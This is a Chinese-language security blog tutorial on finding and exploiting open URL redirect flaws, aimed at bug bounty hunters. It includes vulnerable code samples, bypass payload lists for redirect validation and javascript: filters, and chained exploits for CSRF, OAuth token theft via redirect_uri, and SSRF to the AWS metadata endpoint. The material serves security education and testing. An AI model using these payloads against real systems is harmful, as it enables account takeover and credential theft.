> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzI0MTUwMjQ5Nw==&mid=2247489273&idx=1&sn=8284ae1e363eada815487e41f6401b35

#  利用开放 URL 重定向漏洞的完整指南  
原创 红云谈安全  红云谈安全   2025-07-16 03:01  
  
开放 URL 重定向漏洞很容易发现，因为它们在应用程序中相当常见。这种漏洞类型通常被认为是唾手可得的。然而，随着现代应用程序变得越来越复杂，漏洞也随之增多。这也使得这些唾手可得的漏洞有可能升级为严重程度更高的安全问题。正如我们已经了解如何将[XSS 升级为远程代码执行漏洞]一样，我们也可以将开放 URL 重定向升级为例如完整的帐户接管漏洞。  
  
在本文中，我们将深入探讨什么是开放 URL 重定向漏洞、如何识别它们、利用这些漏洞类型以及如何将它们升级为更高严重性的安全问题。  
  
让我们开始吧！  
## 什么是开放 URL 重定向漏洞？  
  
当易受攻击的 Web 应用程序以不安全的方式处理您的用户输入，从而允许您将用户从受信任的主机重定向到外部（不受信任的）位置时，就会出现开放 URL 重定向漏洞。  
  
重定向主要有两种类型：服务器端重定向（最常见的）和客户端重定向（也称为基于 DOM 的重定向）。让我们深入了解一下这两种类型。  
### 服务器端重定向  
  
服务器端重定向是由易受攻击的应用程序引起的，该应用程序允许未经清理的用户可控输入来控制**位置**  
HTTP 响应标头。  
  
为了更好地帮助理解服务器端开放URL重定向漏洞，请看以下代码片段：  

```
// /modules/logout.php

<?php

// Read the &#34;redirect_url&#34; query parameter
$redirect_url = $_GET[&#34;redirect_url&#34;];

// If the parameter is set, set the Location header and redirect the user
if (isset($redirect_url))
{
    header(&#34;Location: &#34; .$redirect_url);
    die();
}

header(&#34;Location: http://vulnerable-app/login.php&#34;);
die();
?>

```

  
开发人员常犯的一个错误是将未经过滤的用户输入传递到 Location HTTP 响应头中。在这个例子中，**redirect_url**  
查询参数会被读取，并在代码中被添加到 Location HTTP 响应头中。  
  
这是服务器端开放 URL 重定向的一个简单示例。  
### 客户端重定向  
  
客户端重定向是由浏览器（通过客户端 JavaScript 代码）调用的重定向。请查看下方存在漏洞的代码片段，以更好地理解客户端重定向。  

```
// /scripts/app-login.js

// Read the &#34;redirectURL&#34; query parameter
const redirectURL = (new URLSearchParams(location.search)).get('redirectURL');

// If present, pass it to the location.href DOM property
if (redirectURL) {
    window.location.href = redirectURL;
} else {
    window.location.href = &#34;/dashboad&#34;;
};

```

  
在这个简单的示例中，代码检查查询参数**redirectURL**  
是否已设置。之后，它将用户可控制的输入参数传递给DOM接收器。本文稍后还将介绍如何将这个简单的问题升级为跨站点脚本漏洞。  
  
现在让我们更深入地了解如何轻松识别开放重定向漏洞。  
## 识别开放 URL 重定向漏洞  
  
应用内重定向通常用于提升最终用户的应用体验。例如，如果用户尝试访问受保护的页面，他/她可能会首先被重定向到登录页面。因此，开发者通常会发送一个重定向参数，以确保用户在身份验证后被重定向到受保护的页面。  
  
![img](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTA1IiBoZWlnaHQ9IjgxMiI+PC9zdmc+)![An example of a redirect after authentication](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2tvJicUdWXLyAm8RxD7n6eOBpMAUwRUJrCQpsMLuPIOqJcaaiaCB6mH71g/640?wx_fmt=png&from=appmsg "")  
  
  
身份验证后重定向的示例  
  
重要操作完成后也会使用重定向。一个常见的例子是在应用内注册新账户，并在创建账户后重定向到仪表盘。  
  
在不太常见的情况下，重定向也用于优化用户的内容，并且开发人员会根据用户的设备重定向用户。  
  
总而言之，您应该在目标的以下区域中寻找开放的 URL 重定向：  
- 登录和注册页面  
  
- 注销应用程序路由或 API 端点  
  
- 密码重置（检查生成的令牌链接，因为它可能包含重定向参数）  
  
- 个人资料帐户页面  
  
- 电子邮件验证链接  
  
- 错误页面  
  
- 应用内任何需要多个步骤的重要操作  
  
到目前为止，我们已经探讨了什么是开放 URL 重定向以及它们通常存在于何处。让我们来看看如何利用它们，甚至将这些看似不起眼的漏洞升级为高危安全问题！  
## 利用开放 URL 重定向漏洞  
### 简单的开放 URL 重定向  
  
您遇到的大多数重定向参数要么保护措施有限，要么根本没有保护。当没有安全措施时，我们可以轻松地提供任意 URI 作为参数值，并重定向到该特定主机。  
  
看一下之前的 PHP 代码片段：  
  
![img](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNTI5IiBoZWlnaHQ9IjE2MDgiPjwvc3ZnPg==)![Vulnerable code snippet](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2tsdZO0Btmy47B972kURebfs65L0PqMUen04NuwBMK872QduM97CZxuA/640?wx_fmt=png&from=appmsg "")  
  
  
易受攻击的代码片段  
  
在这种特定情况下，我们可以简单地填充**redirect_url**  
查询参数并将最终用户重定向到任何特定主机。  
  
要求：  

```
GET /logout.php?redirect_url=http://attacker.com/ HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.1

```

  
回复：  

```
HTTP/1.1 302 Found
Host: example.com
Connection: close
X-Powered-By: PHP/8.2.26
Location: http://attacker.com/
Content-type: text/html; charset=UTF-8

```

  
这是开放 URL 重定向漏洞最简单的示例，它可能导致多种攻击媒介（取决于上下文），我们将在本文的下一部分中讨论。  
  
让我们继续讨论更高级的情况，在这些情况下我们将主动绕过弱 URL 验证！  
### 高级开放 URL 重定向  
  
防止开放 URL 重定向的正确方法是维护一个严格的允许重定向白名单。然而，由于应用内的重定向通常无法提前预测，开发者往往会验证 URL 的一部分，并据此允许重定向发生。  
#### 利用高级服务器端重定向  
  
我们来看一个验证主机部分的情况：  

```
GET /logout.php?redirect_url=http://example.com/login.php HTTP/1.1
Host: example.com

```

  
任何尝试替换允许的主机都会导致应用程序使用默认路径作为后备。为了绕过此验证，我们可以使用以下开放 URL 重定向有效载荷之一：  

```
# Bypass a HTTP scheme blacklist
//attacker.com
/%0A/attacker.com
/%0D/attacker.com
/%09/attacker.com
/+/attacker.com
///attacker.com
\\attacker.com

# Bypass a URI authority component (//) blacklist
http:example.com
https:example.com

# Bypass weak domain validation
https://example.com@attacker.com
https://example.com.attacker.com
https://attacker.com/example.com
https://attacker.com?example.com
https://attacker.com%23example.com
https://attacker.com%00example.com
https://attacker.com%0Aexample.com
https://attacker.com%0Dexample.com
https://attacker.com%09example.com
https://example.com°attacker.com

# Bypass weak top-level domain (TLD) validation
https://example.comattacker.com
https://example.com.mx
https://example.company                                  # .company is a valid TLD
https://attacker.com%E3%80%82example.com                 # URL encoded Chinese dot

```

  
**将上述有效载荷中的example.com**  
替换为目标允许的主机或域名，将**attack.com**  
替换为您控制的域名。  
  
**提示！PortSwigger 有一个详尽的****URL 验证绕过备忘单****，可以帮助您绕过弱 URL 验证！**  
#### 利用基于 DOM 的高级重定向  
  
正如我们之前提到的，基于 DOM 的重定向是由浏览器发起的。如果我们的输入以不安全的方式处理并传递到 DOM 接收器，我们就可以将开放的 URL 重定向升级为基于 DOM 的跨站点脚本 (XSS) 漏洞。  
  
如果我们看一下之前的易受攻击的代码片段：  
  
![img](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDE1IiBoZWlnaHQ9IjEyNzIiPjwvc3ZnPg==)![Vulnerable code snippet](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2tLCl9TpXIMS0eNzr5xPtABJIicqwFRw5ezocAiaC3SYibAxsEGsrozfbKQ/640?wx_fmt=png&from=appmsg "")  
  
  
易受攻击的代码片段  
  
我们可以轻松发送以下有效载荷来执行
```
alert()
```

  
函数调用：  

```
GET /signin?redirectURL=javascript:alert() HTTP/1.1
Host: example.com

```

  
该有效载荷将被传递到**window.location.href**  
 DOM-sink 并执行我们的任意代码。  
  
下面列出了更多利用 JavaScript 协议的绕过方法，以防我们的基本有效载荷被过滤：  

```
# Simple bypasses
javascript:alert(1)
JavaScript:alert(1)
JAVASCRIPT:alert(1)

# Bypass weak regex patterns (try repositioning the URL-encoded special characters)
ja%20vascri%20pt:alert(1)
jav%0Aascri%0Apt:alert(1)
jav%0Dascri%0Dpt:alert(1)
jav%09ascri%09pt:alert(1)

# More advanced weak regex pattern bypasses
%19javascript:alert(1)
javascript://%0Aalert(1)
javascript://%0Dalert(1)
javascript://https://example.com%0Aalert(1)

```

## 不断升级的开放 URL 重定向漏洞  
  
开放 URL 重定向漏洞通常被认为是唾手可得的。一些漏洞赏金计划甚至会拒绝开放 URL 重定向漏洞，除非你能证明其影响。  
  
幸运的是，这种漏洞类型在某些情况下可以升级，具体取决于具体情况。以下是一些深入描述的示例。  
### 基于 DOM 的跨站点脚本 (XSS)  
  
正如我们在文章前面提到的，如果我们的重定向是从客户端（基于 DOM）发起的，那么就有可能将低严重性漏洞升级为更高严重性的安全问题。  
  
有几种方法可以识别重定向的类型。通常，服务器端重定向总是使用**Location**  
 HTTP 响应标头以及 3XX HTTP 状态代码（例如 301、302 或 307）。  
  
如果您遇到缺少**位置**  
HTTP 响应标头但仍将您重定向（经过短暂延迟）的页面，则通常表示执行了基于 DOM 的重定向。  
  
追溯负责重定向的代码片段也可以帮助您识别重定向类型。此外，您还可以查看是否对您的输入进行了任何验证。  
  
**提示！使用DOMInvador****和****Untrusted Types****之类的工具****来帮助你追踪那些将任意输入传递到 DOM 接收器的漏洞代码！**  
### 基于GET的跨站请求伪造  
  
开放 URL 重定向还可以与某些类型的CSRF 漏洞相结合，以进一步升级它！  
  
看一下以下存在漏洞的代码示例：  
  
![img](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMTU2IiBoZWlnaHQ9IjI2MTYiPjwvc3ZnPg==)![Vulnerable code snippet](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2tWBwFB2PfTSRun95rp5YRcjMJtzzdB2QjUxpZK9lzYp7UibLHHApP4bA/640?wx_fmt=png&from=appmsg "")  
  
  
易受攻击的代码片段  
  
这里，我们注意到两个问题：端点缺乏 CSRF 保护
```
/api/account/profile
```

  
以及 API 端点存在开放的 URL 重定向
```
/redirect
```

  
。  
  
我们可以将这两个问题串联起来，并制作以下概念证明，最终更改访问我们的恶意链接的任何用户的用户名和简历：  

```
GET /redirect?url=%2Fapi%2Faccount%2Fprofile%3Fusername%3DIntigriti%26bio%3DIntigriti HTTP/1.1
Host: example.com

```

  
每个目标都不同，因此我们建议您查找应用程序中其他缺乏 CSRF 保护的关键操作。根据具体情况，将其与开放 URL 重定向链接在一起可能会增加初始问题的严重性。  
### 通过 OAuth 接管帐户  
  
如果您的目标允许使用第三方帐户（例如 Microsoft、Facebook 或 Apple ID）登录，则它很可能使用了流行的身份验证框架，例如 OAuth 2.0。如果您的目标未遵循最佳实践，您可能会泄露访问令牌并实现帐户接管。  
  
如果您遇到 OAuth 实现，例如下面提出的请求：  

```
/api/oauth/apple?client_id=1234&redirect_uri=https://example.com/api/oauth/callback&response_type=token&scope=openid%20profile&state=random-state

```

  
尝试将**redirect_uri**  
参数更改为您控制的任意主机，然后继续OAuth流程。  
  
如果实现确实存在漏洞，它会使用访问令牌将您重定向到受控主机，从而允许您手动调用回调端点并与受害者的帐户启动会话。  
### 服务器端请求伪造  
  
开放 URL 重定向也可用于利用服务器端请求伪造漏洞。某些易受服务器端请求伪造攻击的应用程序仅允许您访问白名单或受信任的主机。如果易受攻击的应用程序也遵循重定向，您可以利用开放 URL 重定向漏洞来利用 SSRF，并升级您最初的发现！  
  
![img](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNjY2IiBoZWlnaHQ9IjMwODQiPjwvc3ZnPg==)![Vulnerable code snippet](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2tvok0yt5OiaSibaW27wVPC2fiaH5icSUo733lE0MzXKoaiaH39VslG30VEqQ/640?wx_fmt=png&from=appmsg "")  
  
  
易受攻击的代码片段  
  
在上述情况下，该程序
```
/api/image-loader
```

  
似乎存在 SSRF 漏洞。然而，它只向受信任的域发出请求。  
  
使用开放的 URL 重定向，我们可以欺骗易受攻击的应用程序，使其尝试加载受信任的主机，但由于 fetch API 默认遵循重定向，因此它会遵循重定向并在本例中返回 AWS 元数据端点：  

```
GET /api/image-loader?url=https%3A%2F%2Fexample.com%2Fredirect%3Furl%3Dhttp%253A%252F%252F169.254.169.254%252F...  HTTP/1.1
Host: example.com

```

## 结论  
  
尽管开放 URL 重定向漏洞很容易发现，并且在大多数复杂应用程序中相当常见，但它们通常被认为是唾手可得的。在本文中，我们介绍了几种利用这些漏洞类型的方法，并将其升级为更高严重程度的安全漏洞，从而提高被接受的可能性！  
  
  
